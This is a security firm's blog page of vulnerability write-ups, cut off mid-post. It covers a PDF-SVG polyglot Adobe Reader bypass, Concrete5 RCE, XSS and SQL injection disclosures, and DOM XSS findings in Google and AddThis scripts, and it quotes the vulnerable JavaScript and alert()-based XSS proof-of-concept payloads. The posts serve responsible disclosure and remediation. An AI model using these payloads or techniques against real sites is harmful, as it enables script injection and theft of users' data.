=== Content from blog.mindedsecurity.com_f9db2508_20250126_020849.html ===


[Subscribe our newsletter](https://mindedsecurity.com/newsletter)

[Minded Security](https://mindedsecurity.com)

* Industry
  + [Automotive/Maritime](https://mindedsecurity.com/industry/automotive-maritime/ "Automotive/Maritime")
  + [Financial](https://mindedsecurity.com/industry/financial/ "Financial")
  + [GDO](https://mindedsecurity.com/industry/gdo/ "GDO")
  + [Industrial Control Systems](https://mindedsecurity.com/industry/industrial-control-systems/ "Industrial Control Systems")
  + [IoT Security](https://mindedsecurity.com/industry/iot-security/ "IoT Security")
  + [Healthcare](https://mindedsecurity.com/industry/healthcare/ "Healthcare")
  + [Government](https://mindedsecurity.com/industry/government/ "Government")
* [Services](https://mindedsecurity.com/our-services/ "Services")
  + [Training](https://mindedsecurity.com/our-services/training/ "Training")
    - [Security Hackaton](https://mindedsecurity.com/services/training/security-hackaton/ "Security Hackaton")
    - [Advanced On-site Training](https://mindedsecurity.com/services/training/advanced-on-site-training/ "Advanced On-site Training")
    - [BlueClosure Training](https://mindedsecurity.com/services/training/blueclosure-training/ "BlueClosure Training")
    - [High Level Training](https://mindedsecurity.com/services/training/high-level-training/ "High Level Training")
    - [Webinar](https://mindedsecurity.com/services/training/webinar/ "Webinar")
  + [Testing](https://mindedsecurity.com/our-services/testing/ "Testing")
    - [Manual Secure Code Review](https://mindedsecurity.com/services/testing/manual-secure-code-review/ "Manual Secure Code Review")
    - [Manual WAPT](https://mindedsecurity.com/services/testing/manual-wapt/ "Manual WAPT")
    - [Cloud Security Testing](https://mindedsecurity.com/services/testing/cloud-security-testing/ "Cloud Security Testing")
    - [IoT Security](https://mindedsecurity.com/services/testing/iot-security/ "IoT Security")
    - [API Security](https://mindedsecurity.com/services/testing/api-security/ "API Security")
    - [Mobile Security Assessment](https://mindedsecurity.com/services/testing/mobile-security-assessment/ "Mobile Security Assessment")
    - [Client Side Assessment](https://mindedsecurity.com/services/testing/client-side-assessment/ "Client Side Assessment")
  + [Consulting](https://mindedsecurity.com/our-services/consulting/ "Consulting")
    - [Software Security Advisory](https://mindedsecurity.com/services/consulting/software-security-advisory/ "Software Security Advisory")
    - [5D Framework](https://mindedsecurity.com/services/consulting/5d-framework/ "5D Framework")
    - [Threat Modeling](https://mindedsecurity.com/services/consulting/threat-modeling/ "Threat Modeling")
    - [Secure Design](https://mindedsecurity.com/services/consulting/secure-design/ "Secure Design")
    - [Secure Architecture Review](https://mindedsecurity.com/services/consulting/secure-architecture-review/ "Secure Architecture Review")
    - [Secure Coding Guidelines](https://mindedsecurity.com/services/consulting/secure-coding-guidelines/ "Secure Coding Guidelines")
    - [Fixing Support](https://mindedsecurity.com/services/consulting/fixing-support/ "Fixing Support")
    - [Outsourcing Development Governance](https://mindedsecurity.com/services/consulting/outsourcing-development-governance/ "Outsourcing Development Governance")
  + [Request a brochure](https://mindedsecurity.com/request-a-brochure/ "Request a brochure")
* Resources
  + [Blog](https://blog.mindedsecurity.com/ "Blog")
  + [News](https://mindedsecurity.com/category/news/ "News")
  + [Videos](https://mindedsecurity.com/videos/ "Videos")
  + [Research](https://mindedsecurity.com/research/ "Research")
  + [Advisories](https://mindedsecurity.com/research/advisories/ "Advisories")
* [About us](https://mindedsecurity.com/our-mission/ "About us")
  + [The Company](https://mindedsecurity.com/the-company/ "The Company")
  + [Contact us](https://mindedsecurity.com/contact-us/ "Contact us")
  + [Newsletter](https://mindedsecurity.com/newsletter/ "Newsletter")
  + [Jobs](https://mindedsecurity.com/jobs/ "Jobs")
  + [Privacy Policy](https://mindedsecurity.com/privacy-policy/ "Privacy Policy")

## IMQ Minded Security Blog

[skip to main](#main)  |
[skip to sidebar](#sidebar)

Showing posts with label **Cross Site Scripting**. [Show all posts](https://blog.mindedsecurity.com/)

Showing posts with label **Cross Site Scripting**. [Show all posts](https://blog.mindedsecurity.com/)

## Tuesday, August 4, 2015

# [PDF-based polyglots through SVG images (CVE-2015-5092)](https://blog.mindedsecurity.com/2015/08/pdf-based-polyglots-through-svg-images.html)

Many vulnerabilities in Adobe Reader were recently patched in [APSB15-15](https://helpx.adobe.com/security/products/reader/apsb15-15.html); the security update addresses a vulnerability (CVE-2015-5092) that we responsibly reported to Adobe PSIRT in April 2015.

The vulnerability consists in a bypass to the PDF content smuggling countermeasure, which Adobe introduced in January 2013 to address PDF-based polyglots. In fact, it was possible to craft PDF-SVG Polyglots which were correctly read both by Adobe Reader (as a PDF document) and by SVG interpreters (as an image).

Such technique could be useful when facing some very specific scenarios, such as:

* Web application allowing SVG images uploads and validating them through a robust (SVG-)XSS filter
* Web application allowing SVG images uploads and relying only on Content Security Policy for protecting against XSS

In both the cases, we are assuming that genuine PDF files uploads are prohibited; in the second scenario we are considering the presence of a server-side SVG parser which verifies that the supplied image is at least well-formed.

Although we all know that allowing SVG files uploads is sufficient for being vulnerable to Stored XSS, this should not be correct in presence of a robust (SVG-)XSS filter, validating untrusted images. In such circumstance, uploading a PDF-based polyglot would permit to bypass the SVG filtering procedure and steal private data by abusing same-origin requests, carried out from the PDF context.

In case of XSS protection achieved through CSP instead, inline JavaScript execution is disabled by default; however, this assumption was not observed in some browsers, when accessing polyglots which evaluated JavaScript code from the PDF context, instead of the SVG one.

Although some limitations are in place when dealing with such vulnerability, it is worth sharing since it turns out quite fascinating from a security research perspective.
First, the vulnerability introduces a potential bypass in tight SVG filters, which accept comments without inspecting their content; moreover, the issue proves destructive when compared with the efforts required for building and testing filters; consider for instance the case of MediaWiki which progressively built a robust [filtering procedure](https://doc.wikimedia.org/mediawiki-core/REL1_25/php/UploadBase_8php_source.html) against user supplied SVG images.
Secondly, polyglots get interesting when dealing with Content Security Policy, especially in case of missing explicit policy directives, by blindly trusting default-src.

Here follows the related paper containing all the details and proof of concepts.

[PDF-based
polyglots through SVG images](https://www.slideshare.net/mindedsecurity/pdfbased-polyglots-through-svg-images "PDF-based polyglots through SVG images") from [mindedsecurity](https://www.slideshare.net/mindedsecurity)

At this point it is important to consider that default installations of Firefox, Chrome and Opera do not use Adobe Reader for rendering PDF files; therefore, potentially affected users are the ones who modified their browser settings in order to use Adobe Reader instead of the default built-in reader. In addition, note that Chrome is going to [disable](https://support.google.com/chrome/answer/6213033) NPAPI support.

Eventually, this issue makes us consider again the risks involved in file uploads, and more generally in content hosting; content sanitization proves insufficient, therefore the usage of [sandboxed domains](http://googleonlinesecurity.blogspot.it/2012/08/content-hosting-for-modern-web.html) is obviously the suggested design choice to operate the expected isolation and mitigate all the involved risks. However, since SVG images can be deployed in many different ways, further observations should be made on this basis.

Users are recommended to update Adobe Reader to version 11.0.12; in addition, blacklisting %PDF- in SVG filtering procedures would be a plus for protecting users using older Reader versions.
From the CSP perspective, instead, setting [object-src](http://www.w3.org/TR/CSP2/#directive-object-src) and [plugin-types](http://www.w3.org/TR/CSP2/#directive-plugin-types) to 'none' would probably be helpful for protecting against similar polyglot-based attacks.

By

[Mauro Gentile](https://www.blogger.com/profile/02458333730600195223 "author profile")

at

[2:59 AM](https://blog.mindedsecurity.com/2015/08/pdf-based-polyglots-through-svg-images.html "permanent link")

[No comments
:](https://blog.mindedsecurity.com/2015/08/pdf-based-polyglots-through-svg-images.html#comment-form)

[![](//img2.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=7122745763234660283&postID=4272879178728089205&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=4272879178728089205&target=email "Email This")
[BlogThis!](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=4272879178728089205&target=blog "BlogThis!")
[Share to X](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=4272879178728089205&target=twitter "Share to X")
[Share to Facebook](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=4272879178728089205&target=facebook "Share to Facebook")
[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=4272879178728089205&target=pinterest "Share to Pinterest")

Labels:
[Adobe](https://blog.mindedsecurity.com/search/label/Adobe)
,
[Content Security Policy](https://blog.mindedsecurity.com/search/label/Content%20Security%20Policy)
,
[Cross Site Scripting](https://blog.mindedsecurity.com/search/label/Cross%20Site%20Scripting)
,
[Polyglots](https://blog.mindedsecurity.com/search/label/Polyglots)
,
[SVG](https://blog.mindedsecurity.com/search/label/SVG)
,
[Web Security](https://blog.mindedsecurity.com/search/label/Web%20Security)

## Friday, June 12, 2015

# [Multiple security issues discovered in Concrete5 - Part 1](https://blog.mindedsecurity.com/2015/06/multiple-security-issues-discovered-in-concrete5-part1.html)

About a month ago we performed a Secure Code Review of **Concrete5 version [5.7.3.1](https://github.com/concrete5/concrete5/releases/tag/5.7.3.1)**, the latest stable release at that time, and discovered multiple security issues within it. In particular we found the following vulnerabilities:

* **A Remote Code Execution**
* **Multiple Reflected Cross Site Scripting**
* **A SQL Injection**
* ...others not fixed yet

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhiJ6myg7yk-aEBl7F2nV0ItF7CiVP78tt-oJrINR2RsYcwrkWWtkjbGH_Y7taBT6niMUP43kPpWthOhoK-p_vV_EWGMKfZ5EM5sC6BEWL6jgJsunOFkJr7IC7HwWGkxge8KV-TqbX2FLo/s400/logo_largo.jpg)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhiJ6myg7yk-aEBl7F2nV0ItF7CiVP78tt-oJrINR2RsYcwrkWWtkjbGH_Y7taBT6niMUP43kPpWthOhoK-p_vV_EWGMKfZ5EM5sC6BEWL6jgJsunOFkJr7IC7HwWGkxge8KV-TqbX2FLo/s1600/logo_largo.jpg)

These issues have been reported to the Concrete5 team through [HackerOne](https://hackerone.com/concrete5), since they have a bug bounty program in place. Some of them were promptly fixed in the next releases of the software, while others still have to be solved.
This is the reason why this post will be in two parts: in this first part we are going to cover the issues already fixed and publicly disclosed on the HackerOne website, while the remainings will be illustrated in the second part.

### Concrete5 CMS

[Concrete5](http://www.concrete5.org/) is one of the most used open source Content Management System (CMS) on the web. A recent infographic published by [CodeGuard](http://blog.codeguard.com/codeguard-state-of-the-web-report/) places Concrete5 as one of the most popular CMS after WordPress, Joomla and Drupal:

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEia6g-hYXOJPMEIlCDoVbjlklyLyzFyLMnTyysm5qXfSLXa7wh4iqBsgHQlVOJPYteLiQjZMAZ-M5369Yc4xDcxkarqxp2LssSIhDG_gdyh9zX3GpjL5_tPLhJVq59YB4iKagIy4dPFw_E/s400/info.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEia6g-hYXOJPMEIlCDoVbjlklyLyzFyLMnTyysm5qXfSLXa7wh4iqBsgHQlVOJPYteLiQjZMAZ-M5369Yc4xDcxkarqxp2LssSIhDG_gdyh9zX3GpjL5_tPLhJVq59YB4iKagIy4dPFw_E/s1600/info.png)

Concrete5, a CMS written in PHP, was launched in 2003 as Concrete CMS. It was rebranded as Concrete5 and launched fully open source under the MIT license in 2008. According to the official website, Concrete5 powers more than 580,000 sites and has a community with over 230,000 members.

### The Issues

#### **Sendmail Remote Code Execution Vulnerability**

****Official Advisory**:**

<https://www.mindedsecurity.com/index.php/research/advisories/msa110615-1>

**Risk**: High
**Cause**: Lack of input validation
**Impact**: Arbitrary PHP Code Execution on the server

One of the most critical issues we discovered is a **Remote Code Execution (RCE)** vulnerability affecting Concrete5 websites which use *sendmail* as mail server. This vulnerability is due to an incorrect validation of an input parameter used to store a setting related to the sender's address of a registration notification email.

The attack can be carried out in two steps:

1. The sender's email address setting is modified to alter the *sendmail* command line in order to add specific parameters which allow to log all the email traffic into an arbitrary file;
2. The attacker will send a specially crafted request to register a new account and will put some malicious PHP code after its email address. This will be written into the log file chosen during the first step, so in case it's a .php file arbitrary PHP code execution may be achieved (using the same technique described [here](http://esec-pentest.sogeti.com/post/Using-mail%28%29-for-Remote-Code-Execution)).

Even though the sender's address parameter can be modified by administrator users only, an attacker might be able to exploit the bug leveraging a Cross-Site Request Forgery (CSRF) vulnerability affecting the related setting feature.
A detailed description of the vulnerability and a sample attack workflow are described in the following PDF:

**- Disclosure Timeline:**
[05/05/2015] - Vulnerability details sent through HackerOne

[05/05/2015] - Vendor said a patch has been committed and will be available in the next version

[05/07/2015] - Version [5.7.4](http://www.concrete5.org/documentation/developers/5.7/background/version-history/5-7-4-release-notes/) released along with the patch for this vulnerability

[06/06/2015] - Vulnerability publicly disclosed on [HackerOne](https://hackerone.com/reports/59663)

#### **Multiple Reflected Cross Site Scripting Vulnerabilities**

****Official Advisory**:**

<https://www.mindedsecurity.com/index.php/research/advisories/msa110615-2>

**Risk**: Medium
**Cause**: Lack of input validation
**Impact**: Unauthorized access to the victim's browser data

During our code review activity we found out that several input parameters are used to generate some HTML output without a proper encoding. This can be exploited to carry out **Reflected Cross Site Scripting (XSS)** attacks.
The following PDF describes the discovered XSS vulnerabilities and provides Proof of Concept (PoC) web pages for them:

**- Disclosure Timeline:**
[05/05/2015] - Vulnerabilities details sent through HackerOne

[05/05/2015] - Vendor said that 2 out of 6 reported vulnerabilities were already fixed in development

[05/07/2015] - Version [5.7.4](http://www.concrete5.org/documentation/developers/5.7/background/version-history/5-7-4-release-notes/) released along with patches for all the 6 vulnerabilities

[06/06/2015] - Vulnerabilities publicly disclosed on [HackerOne](https://hackerone.com/reports/59661)

#### **SQL Injection Vulnerability**

****Official Advisory**:**

<https://www.mindedsecurity.com/index.php/research/advisories/msa110615-3>

**Risk**: Medium
**Cause**: Lack of input validation
**Impact**: Unauthorized access to the data stored into the database

Furthermore we found the presence of a **SQL injection** vulnerability, which is due to certain user input being used to construct a SQL query without a proper validation. This can be exploited to carry out SQL injection attacks leading to unauthorized access to the data stored into the database.
However, the vulnerability is not critical because it is mitigated by the fact that can be exploited only by authenticated users with privileges to edit page permissions.
The following PDF describes the detail of the vulnerability and how to exploit it:

**- Disclosure Timeline:**
[05/05/2015] - Vulnerability details sent through HackerOne

[05/08/2015] - Vendor said a patch has been committed and will be available in the next version

[05/12/2015] - Version [5.7.4.1](http://www.concrete5.org/documentation/developers/5.7/background/version-history/5-7-4-1-release-notes/) released along with the patch for this vulnerability

[06/11/2015] - Vulnerability publicly disclosed on [HackerOne](https://hackerone.com/reports/59664)

Stay tuned for the second part!

By

[Egidio Romano](https://www.blogger.com/profile/14760841123995860416 "author profile")

at

[5:06 AM](https://blog.mindedsecurity.com/2015/06/multiple-security-issues-discovered-in-concrete5-part1.html "permanent link")

[No comments
:](https://blog.mindedsecurity.com/2015/06/multiple-security-issues-discovered-in-concrete5-part1.html#comment-form)

[![](//img2.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=7122745763234660283&postID=3570571547528842091&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=3570571547528842091&target=email "Email This")
[BlogThis!](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=3570571547528842091&target=blog "BlogThis!")
[Share to X](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=3570571547528842091&target=twitter "Share to X")
[Share to Facebook](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=3570571547528842091&target=facebook "Share to Facebook")
[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=3570571547528842091&target=pinterest "Share to Pinterest")

Labels:
[Advisory](https://blog.mindedsecurity.com/search/label/Advisory)
,
[Arbitrary Code Execution](https://blog.mindedsecurity.com/search/label/Arbitrary%20Code%20Execution)
,
[Concrete5](https://blog.mindedsecurity.com/search/label/Concrete5)
,
[Cross Site Scripting](https://blog.mindedsecurity.com/search/label/Cross%20Site%20Scripting)
,
[SQL Injection](https://blog.mindedsecurity.com/search/label/SQL%20Injection)

## Wednesday, February 4, 2015

# [Comparing DOM based XSS Identification Tools on a Real World Vulnerability](https://blog.mindedsecurity.com/2015/02/comparing-dom-based-xss-identification.html)

Due to the lack of literature about DOM Based XSS identification tools awareness, we decided to write a paper that took the actual tools that are stated to be able to identify DOM Based XSS and test their capabilities when dealing with a real world DOM XSS issue.

"..

Minded Security has been the first company to launch a commercial tool aimed to identify DOM Based XSS  with a runtime approach: [DOMinatorPro](https://dominator.mindedsecurity.com/).

In 2012, as a result of our research on DOM XSS, we released the tainting engine on github.com as an open source project and created a commercial version that let users easily identify several kind of JavaScript vulnerabilities with a pretty high rate of accuracy .

Since then, some tools, open source and commercial, have been developed and awareness on this very topic grew among application security experts.

The following paper will try to give an unbiased study supported by objective
facts about precision and accuracy of existing tools that are stated to
identify DOM Based XSS vulnerabilities.

..."

Pdf [here](http://bit.ly/DOMXSSToolComparison)

Every feedback is really welcome!

By

[Stefano Di Paola](https://www.blogger.com/profile/11966634329749157589 "author profile")

at

[9:59 AM](https://blog.mindedsecurity.com/2015/02/comparing-dom-based-xss-identification.html "permanent link")

[No comments
:](https://blog.mindedsecurity.com/2015/02/comparing-dom-based-xss-identification.html#comment-form)

[![](//img2.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=7122745763234660283&postID=4915900996420994219&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=4915900996420994219&target=email "Email This")
[BlogThis!](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=4915900996420994219&target=blog "BlogThis!")
[Share to X](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=4915900996420994219&target=twitter "Share to X")
[Share to Facebook](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=4915900996420994219&target=facebook "Share to Facebook")
[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=4915900996420994219&target=pinterest "Share to Pinterest")

Labels:
[Cross Site Scripting](https://blog.mindedsecurity.com/search/label/Cross%20Site%20Scripting)
,
[DOM Based XSS](https://blog.mindedsecurity.com/search/label/DOM%20Based%20XSS)
,
[Dom Xss](https://blog.mindedsecurity.com/search/label/Dom%20Xss)
,
[DOMinator](https://blog.mindedsecurity.com/search/label/DOMinator)
,
[DOMinatorPro](https://blog.mindedsecurity.com/search/label/DOMinatorPro)
,
[JavaScript Security](https://blog.mindedsecurity.com/search/label/JavaScript%20Security)
,
[security tools](https://blog.mindedsecurity.com/search/label/security%20tools)

## Thursday, November 8, 2012

# [DOMinatorPro Fuzzer finds a DOM XSS on Google.com](https://blog.mindedsecurity.com/2012/11/dominatorpro-fuzzer-finds-dom-xss-on.html)

#### **Introduction a.k.a. tl;dr**

A quite simple DOM Based XSS was found on https://www.google.com/ context using [DOMinatorPro](https://dominator.mindedsecurity.com/).

What I think it's interesting here, is to show how DOMinatorPro works in this real world case.

In order to give a more detailed description, i [recorded a video](//www.youtube.com/watch?v=fh21ly5LNkg&feature=youtu.be&hd=1) (HD) to show how DOMinatorPro can help in finding those particular kind of issues.

#### **Some Details**

DOMinatorPro is a runtime JavaScript DOM XSS analyzer, which means it can check for complex filters and help in finding debug and/or unreferenced parameters during JavaScript execution.

In order to do that, DOMinatorPro exposes a fuzzer button which fuzzes the URL query string and html input elements that have keyboard events attached to them as shown in the [youtube video](//www.youtube.com/watch?v=fh21ly5LNkg&feature=youtu.be&hd=1).

By using that feature I found that the code in
> http://www.googleadservices.com/pagead/landing.js

uses unvalidated input to build the argument for two *document.write* call.

This javascript is used, among others, by:
> http://www.google.com/toolbar/ie/index.html

and
> https://www.google.com/toolbar/ie/index.html

which means that one more time a (almost) 3rd party script introduces a flaw in the context of an unaware domain.
#### Source Analysis

From http://www.googleadservices.com/pagead/landing.js (which has now been removed) the following lines do not escape user input:

Line 53:
> if (w.google\_conversion\_ad) {
>
>       url = url + "&gad=" + w.**google\_conversion\_ad**;
>
>     }
>
>     if (w.google\_conversion\_key) {
>
>       url = url + "&gkw=" + w.**google\_conversion\_key**;
>
>     }
>
>     if (w.google\_conversion\_mtc) {
>
>       url = url + "&gmtc=" + w.**google\_conversion\_mtc**;
>
>     }
>
>     if (w.google\_conversion\_raw) {
>
>       url = url + "&graw=" + w.**google\_conversion\_raw**;
>
>     }
>
>     if (w.google\_conversion\_domain) {
>
>       url = url + "&dom=" + w.**google\_conversion\_domain**;
>
>     }

And those values are taken by using :
> function google\_get\_param(url, param) {
>
> var i;
>
> var val;
>
> if ((i = url.indexOf("?" + param + "=")) > -1 ||
>
> (i = url.indexOf("?" + param.toUpperCase() + "=")) > -1 ||
>
> (i = url.indexOf("&" + param + "=")) > -1 ||
>
> (i = url.indexOf("&" + param.toUpperCase() + "=")) > -1) {
>
> val = url.substring(i + param.length + 2, url.length);
>
> if ((i = val.indexOf("&")) > -1) {
>
> val = val.substring(0, i);
>
> }
>
> }
>
> return val;
>
> }

...
> google\_conversion\_ad = google\_get\_param(url, "gad");
>
> if (window.google\_conversion\_ad) {
>
> (google\_conversion\_key = google\_get\_param(url, "gkw")) ||
>
> (google\_conversion\_key = google\_get\_param(url, "ovkey"));
>
> google\_conversion\_mtc = google\_get\_param(url, "ovmtc");
>
> google\_conversion\_raw = google\_get\_param(url, "ovraw");
>
> }
>
> }

After the previous code, the url variable is used on line 91:

> *document.write*('' name="google\_conversion\_frame"' +
> ' width="' + width + '"' +
> ' height="' + height + '"' +
> ' src="' + url + '"' +
> ' frameborder="0"' +
> ' marginwidth="0"' +
> ' marginheight="0"' +
> ' vspace="0"' +
> ' hspace="0"' +
> ' allowtransparency="true"' +
> ' scrolling="no">');

and line 103:

> *document.write*('*'src="' + url + '&ifr' + 'ame=0"' +
> ' />');*

so the offending url (which can be found with DOMinatorPro fuzzer), is:

> http://www.google.com/toolbar/ie/index.html?&gad=bbbb&gkw=yyyy&ovkey=10101010&ovmtc=14141414&ovraw=18181818&

and on any of those parameters can be added an attack payload like:

> AAAA"onload="alert(document.domain)"

#### Remediation

I suggested that the use of encodeURIComponent on user data
> if (w.google\_conversion\_ad) {
>
>       url = url + "&gad=" + **encodeURIComponent**(w.google\_conversion\_ad);
>
>     }
>
>     if (w.google\_conversion\_key) {
>
>       url = url + "&gkw=" +
>
> **encodeURIComponent**(w.google\_conversion\_key);
>
>     }
>
>     if (w.google\_conversion\_mtc) {
>
>       url = url + "&gmtc=" +
>
> **encodeURIComponent**(w.google\_conversion\_mtc);
>
>     }
>
>     if (w.google\_conversion\_raw) {
>
>       url = url + "&graw=" +
>
> **encodeURIComponent**(w.google\_conversion\_raw);
>
>     }
>
>     if (w.google\_conversion\_domain) {
>
>       url = url + "&dom=" +
>
> **encodeURIComponent**(w.google\_conversion\_domain);
>
>     }

would have solved the problem.

Anyway, Google fixed that by removing that script for good, which is a solution as well! :)
#### Conclusions

As already said in my [previous](http://blog.mindedsecurity.com/2012/11/dom-xss-on-google-plus-one-button.html) post, I still see DOM based XSS all around with little awareness and difficulties by all actors in SDLC in identifying them.

[DOMinatorPro](https://dominator.mindedsecurity.com/#buy) can really help in finding DOM based XSS and it does that by helping testers, developers or QA users by trying to give the information they need by adapting to the knowledge they have.

**Give DOMinatorPro a Try**

Do you still trust all those 3rd party JavaScripts embedded in your pages ?

Just browse your site with DOMinatorPro or fuzz your pages and see what happens. :)

In case you need help, check out our [professional services](https://dominator.mindedsecurity.com/#proservices) or just ask for a [contact](https://dominator.mindedsecurity.com/#contact).

By

[Stefano Di Paola](https://www.blogger.com/profile/18241677936736054546 "author profile")

at

[5:17 AM](https://blog.mindedsecurity.com/2012/11/dominatorpro-fuzzer-finds-dom-xss-on.html "permanent link")

[5 comments
:](https://blog.mindedsecurity.com/2012/11/dominatorpro-fuzzer-finds-dom-xss-on.html#comment-form)

[![](//img2.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=7122745763234660283&postID=2959666193434218946&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=2959666193434218946&target=email "Email This")
[BlogThis!](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=2959666193434218946&target=blog "BlogThis!")
[Share to X](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=2959666193434218946&target=twitter "Share to X")
[Share to Facebook](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=2959666193434218946&target=facebook "Share to Facebook")
[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=2959666193434218946&target=pinterest "Share to Pinterest")

Labels:
[3rd party javascript](https://blog.mindedsecurity.com/search/label/3rd%20party%20javascript)
,
[Cross Site Scripting](https://blog.mindedsecurity.com/search/label/Cross%20Site%20Scripting)
,
[DOM Based XSS](https://blog.mindedsecurity.com/search/label/DOM%20Based%20XSS)
,
[Dom Xss](https://blog.mindedsecurity.com/search/label/Dom%20Xss)
,
[DOMinator](https://blog.mindedsecurity.com/search/label/DOMinator)
,
[DOMinatorPro](https://blog.mindedsecurity.com/search/label/DOMinatorPro)
,
[JavaScript Security](https://blog.mindedsecurity.com/search/label/JavaScript%20Security)

## Thursday, September 27, 2012

# [Analysis of Dom Xss vulnerability in a Facebook Like Button implementation](https://blog.mindedsecurity.com/2012/09/analysis-of-dom-xss-vulnerability-in.html)

Note: The following vulnerability is now patched. Thanks to Matt, Charlie and to the Addthis.com team that released a patch yesterday after receiving our advisory.

### Description

I like very much facebook, and I like clicking on facebook like buttons like the one below. *Addthis.com* has its own implementation of *Facebook Like Button* and is very used among internet websites. They estimate that unique websites around the world are several millions.

A Facebook Like Button in a Share Widget Bar:

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiC5QR9Gmbv2gUYESiJ0tWWeVQ9Mk_7Y5ZzL_lC8u7HLW2nxFK9dm4dvB0OhD2iQT_aawp4uTGW2dMqSEMrt-FIdgl47qlHfTZchT9GEYvDHTbvIbfctLlWtQB-BNjd17L67fFgtQD3ew/s400/facebooklike.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiC5QR9Gmbv2gUYESiJ0tWWeVQ9Mk_7Y5ZzL_lC8u7HLW2nxFK9dm4dvB0OhD2iQT_aawp4uTGW2dMqSEMrt-FIdgl47qlHfTZchT9GEYvDHTbvIbfctLlWtQB-BNjd17L67fFgtQD3ew/s1600/facebooklike.png)

You can find some background information already in one of our previous posts:

•    <http://blog.mindedsecurity.com/2012/09/temporary-patch-for-dom-xss-0day-in.html>

### Proof of Concept

**http://www.website-with-addthis-widget.con/#"></fb:like><img/src="aaa"/onerror="alert('DomXss Found!')**

*Note: This reflected dombased cross site scripting (before the patch) was present in a tremendous number of websites*

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgy8ICgzlMiUaMsmtu3m18XhBYUh38S5zyCWGewn_ldZVNRrQl8CtLBy5LaIjnu1pef-70eBSguXa-tTa6I15X2BCSdHDoSfD4GWKvG2IvztwlgVaUmPnLX51lbHBMOkeeXJe8fT8fMJQ/s400/addowned2.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgy8ICgzlMiUaMsmtu3m18XhBYUh38S5zyCWGewn_ldZVNRrQl8CtLBy5LaIjnu1pef-70eBSguXa-tTa6I15X2BCSdHDoSfD4GWKvG2IvztwlgVaUmPnLX51lbHBMOkeeXJe8fT8fMJQ/s1600/addowned2.png)

####

#### Vulnerable Code

```

if (F.href === _1) {
d = _8.util.clone(E.share.url_transforms || {});
d.defrag = 1;
F.href = _8.track.mgu(E.share.url, d);//-- Location
}
for (A in F) {
B += " " + A + "=\"" + F[A] + "\"";//-- Attribute Set
}
if (!E.share.xid) {
E.share.xid = _8.util.cuid();
}
f[F.href] = {};
for (A in E.share) {
f[F.href][A] = E.share[A];&nbsp;
}
G.innerHTML = "<fb:like br="br"
ref="\">_8.share.gcp(E.share, E.conf,".like").replace(",", "_")
+ "\" " + B + "</fb:like>"; //-- DomXss
p(G);

```

### Analysis and discovery with DOMinatorPro

Even if to the reader this issue seems like a common cross site scripting, finding such kind of security issues in Javascript code (aka DomXss) is an extremely complex task.

This is why our Advanced Research team developed DOMinatorPro. DOMinatorPro can be downloaded from the following dedicated website: [http://dominator.mindedsecurity.com](http://dominator.mindedsecurity.com/).

**DOMinatorPro is a Free Opensource Project with Commercial Extensions. Commercial extensions have a 15 days Free Trial Period.**

The vulnerability was in ONE of the scripts loaded by the “addthis\_widget.js”  script available online at “<http://s7.addthis.com/js/300/addthis_widget.js>”. As you can see multiple scripts are loaded and the scripts are compressed and obfuscated , giving to human security reviewers a painful and a very long and time comsuming task to accomplish.

*Note: The following part is taken from the DOMinatorPro user manual and shows a similar vulnerability in a demo context. In* **DOMinatorPro* user manual you can find sample cases to help you understand the cause of the vulnerability for producing solid Javascript patches.*

By the way, when browsing to a website with a vulnerable
“Facebook - Like Button” with DOMinatorPro tool you will see in a
couple of seconds the following alert:

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjxOp9l2ix_YVj21ZGszanxVLo7fxWwfvZ96k4q8FyhwwPLROG3tGVcWQyEHnhk-QEzp-cXwRItYVmPppZ6PhpannzTkn3EhhrfiBslazBsMB57zEkRXY-2dseyM9SiD46WzQQ9O9A7MQ/s400/alert.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjxOp9l2ix_YVj21ZGszanxVLo7fxWwfvZ96k4q8FyhwwPLROG3tGVcWQyEHnhk-QEzp-cXwRItYVmPppZ6PhpannzTkn3EhhrfiBslazBsMB57zEkRXY-2dseyM9SiD46WzQQ9O9A7MQ/s1600/alert.png)
From the previous screenshot the very interesting information is that you got an HTML Injection (e.g. Cross Site Scripting) from the *location.href* (e.g. the URL).
Important Note: Sink describes where the vulnerability is and the Source is where the controllable input comes from.

Summary of the issue: *HTML injection vulnerability coming from a user supplied input location.href (URL)*.

#### Source History

